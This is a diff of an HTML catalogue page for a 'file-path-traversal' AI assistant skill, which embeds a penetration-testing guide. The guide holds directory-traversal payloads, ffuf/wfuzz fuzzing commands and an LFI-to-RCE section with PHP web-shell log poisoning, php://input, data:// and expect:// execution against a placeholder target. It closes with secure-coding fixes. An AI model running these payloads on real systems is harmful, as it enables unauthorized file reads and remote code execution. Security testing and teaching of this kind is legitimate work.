@@ -4,63 +4,113 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>file-path-traversal - AICCLI</title>
-  <meta name="description" content="file-path-traversal - Claude Code skill for AICCLI">
+  <meta name="description" content="This skill should be used when the user asks to "test for directory traversal", "exploit path traversal vulnerabilities", "read arbitrary files through web appl">
   <link rel="icon" type="image/x-icon" href="favicon.ico">
-  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
   <style>
-    :root {
-      --bg-dark: #0a0a0f;
-      --glass-bg: rgba(255, 255, 255, 0.03);
-      --glass-border: rgba(255, 255, 255, 0.08);
-      --text-primary: #ffffff;
-      --text-secondary: #a0a0b0;
-      --text-muted: #606070;
-      --accent: #a855f7;
-      --accent-glow: rgba(168, 85, 247, 0.3);
-      --cyan: #22d3ee;
-    }
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Space Grotesk', sans-serif; background: var(--bg-dark); color: var(--text-primary); min-height: 100vh; }
-    body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(ellipse at 20% 20%, rgba(168, 85, 247, 0.15) 0%, transparent 50%), radial-gradient(ellipse at 80% 80%, rgba(34, 211, 238, 0.1) 0%, transparent 50%); pointer-events: none; z-index: -1; }
-    header { position: sticky; top: 0; z-index: 100; backdrop-filter: blur(20px); border-bottom: 1px solid var(--glass-border); background: rgba(10, 10, 15, 0.8); }
-    .header-content { max-width: 1400px; margin: 0 auto; padding: 16px 20px; display: flex; align-items: center; gap: 20px; }
-    .logo-link { display: flex; align-items: center; gap: 12px; text-decoration: none; }
-    .logo { width: 40px; height: 40px; border-radius: 10px; border: 2px solid var(--accent); }
-    .brand { font-size: 24px; font-weight: 700; color: var(--accent); letter-spacing: -1px; }
-    .breadcrumb { margin-left: auto; color: var(--text-secondary); font-size: 14px; }
-    .breadcrumb a { color: var(--text-secondary); text-decoration: none; }
-    .breadcrumb a:hover { color: var(--accent); }
-    .container { max-width: 1400px; margin: 0 auto; padding: 40px 20px; }
-    .card { background: var(--glass-bg); border: 1px solid var(--glass-border); border-radius: 20px; padding: 32px; backdrop-filter: blur(20px); margin-bottom: 30px; }
-    h1 { font-size: 36px; margin-bottom: 16px; letter-spacing: -1px; background: linear-gradient(135deg, var(--accent), var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-    .meta { display: flex; gap: 16px; flex-wrap: wrap; margin-bottom: 24px; }
-    .meta-item { padding: 8px 16px; background: rgba(168, 85, 247, 0.15); border: 1px solid var(--accent); border-radius: 20px; font-size: 13px; color: var(--accent); }
-    .content-section h2 { font-size: 20px; margin: 24px 0 16px; color: var(--text-primary); }
-    pre { background: rgba(0, 0, 0, 0.4); border: 1px solid var(--glass-border); border-radius: 16px; padding: 24px; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 14px; line-height: 1.6; color: var(--text-secondary); white-space: pre-wrap; word-wrap: break-word; }
-    code { background: rgba(168, 85, 247, 0.15); padding: 2px 8px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; color: var(--cyan); }
-    .description { font-size: 16px; color: var(--text-secondary); line-height: 1.7; margin-bottom: 24px; }
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Inter',sans-serif;background:#fafafa;color:#1a1a1a;line-height:1.6}
+    .container{max-width:900px;margin:0 auto;padding:0 24px}
+    header{background:#fff;border-bottom:1px solid #e5e5e5;position:sticky;top:0;z-index:100;padding:12px 0}
+    header .container{display:flex;align-items:center;justify-content:space-between}
+    .logo{display:flex;align-items:center;gap:10px;text-decoration:none}
+    .logo img{width:32px;height:32px;border-radius:6px}
+    .logo span{font-size:18px;font-weight:700;color:#1a1a1a}
+    .nav{display:flex;gap:8px}
+    .nav a{padding:8px 16px;border-radius:6px;text-decoration:none;color:#666;font-size:14px;font-weight:500;transition:all .2s}
+    .nav a:hover{background:#f5f5f5;color:#1a1a1a}
+    .breadcrumb{padding:24px 0 0;font-size:14px;color:#888}
+    .breadcrumb a{color:#666;text-decoration:none}
+    .breadcrumb a:hover{color:#1a1a1a}
+    .content{padding:32px 0 64px}
+    .header{display:flex;align-items:flex-start;gap:20px;margin-bottom:32px}
+    .icon{width:64px;height:64px;background:#f5f5f5;border-radius:16px;display:flex;align-items:center;justify-content:center;font-size:28px;flex-shrink:0}
+    .title{flex:1}
+    .title h1{font-size:32px;font-weight:700;margin-bottom:8px}
+    .title .meta{display:flex;gap:12px;flex-wrap:wrap}
+    .badge{padding:6px 12px;background:#f5f5f5;border-radius:6px;font-size:13px;color:#666}
+    .badge.type{background:#e8f4ff;color:#0066cc}
+    .desc{font-size:18px;color:#444;margin-bottom:32px;line-height:1.7}
+    .section{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px;margin-bottom:24px}
+    .section h2{font-size:20px;font-weight:600;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid #e5e5e5}
+    .install-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
+    .install-box p{color:#888;font-size:13px;margin-bottom:8px}
+    .install-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
+    .copy-btn{float:right;padding:8px 16px;background:#fff;color:#1a1a1a;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500}
+    .copy-btn:hover{background:#f5f5f5}
+    pre{background:#f8f8f8;border:1px solid #e5e5e5;border-radius:12px;padding:20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.5}
+    .how-to{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px}
+    .how-to h2{font-size:20px;font-weight:600;margin-bottom:16px}
+    .how-to ol{margin:16px 0;padding-left:24px}
+    .how-to li{margin-bottom:12px;color:#444}
+    .how-to code{background:#f5f5f5;padding:2px 6px;border-radius:4px;font-size:13px}
+    .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
+    .tag{padding:6px 12px;background:#f5f5f5;border-radius:20px;font-size:12px;color:#666}
+    .stats{display:flex;gap:24px;margin-top:20px;padding-top:20px;border-top:1px solid #e5e5e5}
+    .stat{text-align:center}
+    .stat strong{display:block;font-size:24px;font-weight:600;color:#1a1a1a}
+    .stat span{font-size:12px;color:#888}
+    @media(max-width:768px){.header{flex-direction:column}.install-box code{font-size:12px}}
   </style>
 </head>
 <body>
   <header>
-    <div class="header-content">
-      <a href="../index.html" class="logo-link"><img src="../logo.png" alt="AICCLI" class="logo"><span class="brand">AICCLI</span></a>
-      <div class="breadcrumb"><a href="../index.html">Home</a> / <a href="../skill.html">Skill</a> / file-path-traversal</div>
+    <div class="container">
+      <a href="index.html" class="logo"><img src="logo.png" alt="AICCLI"><span>AICCLI</span></a>
+      <nav class="nav">
+        <a href="index.html">Components</a>
+        <a href="docs.html">Docs</a>
+        <a href="install.html">Install</a>
+      </nav>
     </div>
   </header>
+
   <div class="container">
-    <div class="card">
-      <h1>file-path-traversal</h1>
-      <div class="meta">
-        <span class="meta-item">Skill</span>
-        <span class="meta-item">security</span>
+    <div class="breadcrumb">
+      <a href="index.html">Home</a> / <a href="index.html">skills</a> / security / file-path-traversal
+    </div>
+  </div>
+
+  <main class="container content">
+    <div class="header">
+      <div class="icon">⚡</div>
+      <div class="title">
+        <h1>file-path-traversal</h1>
+        <div class="meta">
+          <span class="badge type">Skill</span>
+          <span class="badge">security</span>
+          
+        </div>
       </div>
-      <div class="description"><pre>---
+    </div>
+
+    <p class="desc">This skill should be used when the user asks to "test for directory traversal", "exploit path traversal vulnerabilities", "read arbitrary files through web applications", "find LFI vulnerabilities", or "access files outside web root". It provides comprehensive file path traversal attack and testing methodologies.</p>
+
+    <div class="section">
+      <h2>How to Use</h2>
+      <div class="how-to">
+        <ol>
+          <li><strong>Install via CLI:</strong> Run <code>npx aiccli install skills/file-path-traversal</code> in your terminal</li>
+          <li><strong>Or with OpenCode:</strong> Run <code>opencode install skills/file-path-traversal</code></li>
+          <li><strong>Manual install:</strong> Copy the configuration below and add it to your project's config</li>
+        </ol>
+        
+        <div class="install-box">
+          <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
+          <p>Installation Command:</p>
+          <code id="install-cmd">npx aiccli install skills/file-path-traversal</code>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <h2>Configuration</h2>
+      <pre id="config"><code>---
 name: File Path Traversal Testing
-description: This skill should be used when the user asks to "test for directory traversal", "exploit path traversal vulnerabilities", "read arbitrary files through web applications", "find LFI vulnerabilities", or "access files outside web root". It provides comprehensive file path traversal attack and testing methodologies.
+description: This skill should be used when the user asks to &quot;test for directory traversal&quot;, &quot;exploit path traversal vulnerabilities&quot;, &quot;read arbitrary files through web applications&quot;, &quot;find LFI vulnerabilities&quot;, or &quot;access files outside web root&quot;. It provides comprehensive file path traversal attack and testing methodologies.
 metadata:
   author: zebbern
-  version: "1.1"
+  version: &quot;1.1&quot;
 ---
 
 # File Path Traversal Testing
@@ -99,11 +149,11 @@ Path traversal occurs when applications use user input to construct file paths:
 
 ```php
 // Vulnerable PHP code example
-$template = "blue.php";
-if (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {
-    $template = $_COOKIE['template'];
+$template = &quot;blue.php&quot;;
+if (isset($_COOKIE[&#039;template&#039;]) &amp;&amp; !empty($_COOKIE[&#039;template&#039;])) {
+    $template = $_COOKIE[&#039;template&#039;];
 }
-include("/home/user/templates/" . $template);
+include(&quot;/home/user/templates/&quot; . $template);
 ```
 
 Attack principle:
@@ -170,8 +220,8 @@ Common vulnerable functionality:
 ..%252F..%252F..%252Fetc%252Fpasswd  # Double encoding
 
 # Test payloads with curl
-curl "http://target.com/image?filename=../../../etc/passwd"
-curl "http://target.com/download?file=....//....//....//etc/passwd"
+curl &quot;http://target.com/image?filename=../../../etc/passwd&quot;
+curl &quot;http://target.com/download?file=....//....//....//etc/passwd&quot;
 ```
 
 #### Absolute Path Injection
@@ -343,12 +393,12 @@ C:\Documents and Settings\&lt;user&gt;\
 
 ```bash
 # Basic traversal fuzzing
-ffuf -u "http://target.com/image?filename=FUZZ" \
+ffuf -u &quot;http://target.com/image?filename=FUZZ&quot; \
      -w /usr/share/wordlists/traversal.txt \
      -mc 200
 
 # Fuzzing with encoding
-ffuf -u "http://target.com/page?file=FUZZ" \
+ffuf -u &quot;http://target.com/page?file=FUZZ&quot; \
      -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
      -mc 200,500 -ac
 ```
@@ -359,12 +409,12 @@ ffuf -u "http://target.com/page?file=FUZZ" \
 # Traverse to /etc/passwd
 wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
       --hc 404 \
-      "http://target.com/index.php?file=FUZZ"
+      &quot;http://target.com/index.php?file=FUZZ&quot;
 
 # With headers/cookies
 wfuzz -c -z file,traversal.txt \
-      -H "Cookie: session=abc123" \
-      "http://target.com/load?path=FUZZ"
+      -H &quot;Cookie: session=abc123&quot; \
+      &quot;http://target.com/load?path=FUZZ&quot;
 ```
 
 ### Phase 8: LFI to RCE Escalation
@@ -373,43 +423,43 @@ wfuzz -c -z file,traversal.txt \
 
 ```bash
 # Inject PHP code into logs
-curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://target.com/
+curl -A &quot;&lt;?php system(\$_GET[&#039;cmd&#039;]); ?&gt;&quot; http://target.com/
 
 # Include Apache log file
-curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"
+curl &quot;http://target.com/page?file=../../../var/log/apache2/access.log&amp;cmd=id&quot;
 
 # Include auth.log (SSH)
-# First: ssh '&lt;?php system($_GET["cmd"]); ?&gt;'@target.com
-curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
+# First: ssh &#039;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#039;@target.com
+curl &quot;http://target.com/page?file=../../../var/log/auth.log&amp;cmd=whoami&quot;
 ```
 
 #### Proc/self/environ
 
 ```bash
 # Inject via User-Agent
-curl -A "&lt;?php system('id'); ?&gt;" \
-     "http://target.com/page?file=/proc/self/environ"
+curl -A &quot;&lt;?php system(&#039;id&#039;); ?&gt;&quot; \
+     &quot;http://target.com/page?file=/proc/self/environ&quot;
 
 # With command parameter
-curl -A "&lt;?php system(\$_GET['c']); ?&gt;" \
-     "http://target.com/page?file=/proc/self/environ&c=whoami"
+curl -A &quot;&lt;?php system(\$_GET[&#039;c&#039;]); ?&gt;&quot; \
+     &quot;http://target.com/page?file=/proc/self/environ&amp;c=whoami&quot;
 ```
 
 #### PHP Wrapper Exploitation
 
 ```bash
 # php://filter - Read source code as base64
-curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"
+curl &quot;http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php&quot;
 
 # php://input - Execute POST data as PHP
-curl -X POST -d "&lt;?php system('id'); ?&gt;" \
-     "http://target.com/page?file=php://input"
+curl -X POST -d &quot;&lt;?php system(&#039;id&#039;); ?&gt;&quot; \
+     &quot;http://target.com/page?file=php://input&quot;
 
 # data:// - Execute inline PHP
-curl "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"
+curl &quot;http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&amp;c=id&quot;
 
 # expect:// - Execute system commands
-curl "http://target.com/page?file=expect://id"
+curl &quot;http://target.com/page?file=expect://id&quot;
 ```
 
 ### Phase 9: Testing Methodology
@@ -449,22 +499,22 @@ Secure coding practices:
 
 ```php
 // PHP: Use basename() to strip paths
-$filename = basename($_GET['file']);
-$path = "/var/www/files/" . $filename;
+$filename = basename($_GET[&#039;file&#039;]);
+$path = &quot;/var/www/files/&quot; . $filename;
 
 // PHP: Validate against whitelist
-$allowed = ['report.pdf', 'manual.pdf', 'guide.pdf'];
-if (in_array($_GET['file'], $allowed)) {
-    include("/var/www/files/" . $_GET['file']);
+$allowed = [&#039;report.pdf&#039;, &#039;manual.pdf&#039;, &#039;guide.pdf&#039;];
+if (in_array($_GET[&#039;file&#039;], $allowed)) {
+    include(&quot;/var/www/files/&quot; . $_GET[&#039;file&#039;]);
 }
 
 // PHP: Canonicalize and verify base path
-$base = "/var/www/files/";
+$base = &quot;/var/www/files/&quot;;
 $realBase = realpath($base);
-$userPath = $base . $_GET['file'];
+$userPath = $base . $_GET[&#039;file&#039;];
 $realUserPath = realpath($userPath);
 
-if ($realUserPath && strpos($realUserPath, $realBase) === 0) {
+if ($realUserPath &amp;&amp; strpos($realUserPath, $realBase) === 0) {
     include($realUserPath);
 }
 ```
@@ -480,9 +530,9 @@ def safe_file_access(base_dir, filename):
     
     # Verify file is within base directory
     if file_path.startswith(base):
-        return open(file_path, 'r').read()
+        return open(file_path, &#039;r&#039;).read()
     else:
-        raise Exception("Access denied")
+        raise Exception(&quot;Access denied&quot;)
 ```
 
 ## Quick Reference
@@ -541,8 +591,39 @@ def safe_file_access(base_dir, filename):
 | No response difference | Try encoding, blind traversal, different files |
 | Payload blocked | Use encoding variants, nested sequences, case variations |
 | Cannot escalate to RCE | Check logs, PHP wrappers, file upload, session poisoning |
-</pre></div>
+</code></pre>
     </div>
-  </div>
+
+    
+
+    <div class="section">
+      <h2>Info</h2>
+      <div class="stats">
+        <div class="stat">
+          <strong>35</strong>
+          <span>Downloads</span>
+        </div>
+        <div class="stat">
+          <strong>1.0</strong>
+          <span>Version</span>
+        </div>
+        <div class="stat">
+          <strong>MIT</strong>
+          <span>License</span>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    function copyConfig() {
+      const config = document.getElementById('config').textContent;
+      navigator.clipboard.writeText(config).then(() => {
+        const btn = document.querySelector('.copy-btn');
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = 'Copy Config', 2000);
+      });
+    }
+  </script>
 </body>
 </html>
